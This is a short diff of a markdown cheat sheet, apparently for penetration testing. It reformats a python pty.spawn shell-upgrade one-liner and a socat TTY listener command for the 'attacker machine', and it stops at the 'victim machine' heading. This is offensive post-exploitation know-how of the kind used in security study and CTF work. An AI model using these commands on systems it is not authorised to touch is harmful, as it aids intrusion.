@@ -18,7 +18,7 @@ or you can also use other techniques like script or ruby
 
 ## Methode 3 : stty options (fully interactive)
 
-> **python -c 'import pty;pty.spawn("/bin/bash")' ** 
+> **python -c 'import pty;pty.spawn("/bin/bash")'** 
 
 > ****
 
@@ -57,7 +57,9 @@ if installed  you can launch a reverse shell with it
 
 on attacker machine : 
 
-> **socat file:`tty`,raw,echo=0 tcp-listen:<port>**  
+```
+ socat file:`tty`,raw,echo=0 tcp-listen:<port>
+```
 
 on victim machine   :
 
